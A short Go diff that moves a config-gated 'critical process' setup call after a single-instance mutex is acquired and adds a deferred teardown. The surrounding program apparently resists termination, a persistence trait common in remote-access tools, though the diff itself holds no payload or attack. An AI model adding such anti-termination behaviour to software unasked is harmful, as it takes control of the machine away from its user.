@@ -35,10 +35,6 @@ func main() {
 		}
 	}
 
-	if cfg.CriticalProcess {
-		criticalproc.Setup()
-	}
-
 	releaseMutex, ok, err := mutex.Acquire(cfg.Mutex)
 	if err != nil {
 		log.Printf("[mutex] failed to initialize mutex: %v", err)
@@ -52,6 +48,11 @@ func main() {
 	}
 	defer releaseMutex()
 	mutex.SetGlobalRelease(releaseMutex)
+
+	if cfg.CriticalProcess {
+		criticalproc.Setup()
+		defer criticalproc.Teardown()
+	}
 
 	for {
 		func() {
